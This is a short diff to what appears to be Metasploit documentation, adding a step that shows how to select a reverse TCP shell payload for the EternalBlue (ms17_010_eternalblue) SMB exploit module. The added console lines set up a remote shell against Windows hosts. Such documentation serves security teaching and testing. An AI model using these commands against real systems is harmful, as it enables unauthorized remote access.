@@ -235,6 +235,11 @@ Compatible Payloads
    1   generic/shell_bind_tcp                                       manual  No     Generic Command Shell, Bind TCP Inline
    2   generic/shell_reverse_tcp                                    manual  No     Generic Command Shell, Reverse TCP Inline
 ```  
+Once you have decided on the payload, you can use the `set payload` command to make your choice.  
+```
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 2
+payload => generic/shell_reverse_tcp
+```
 
 
 
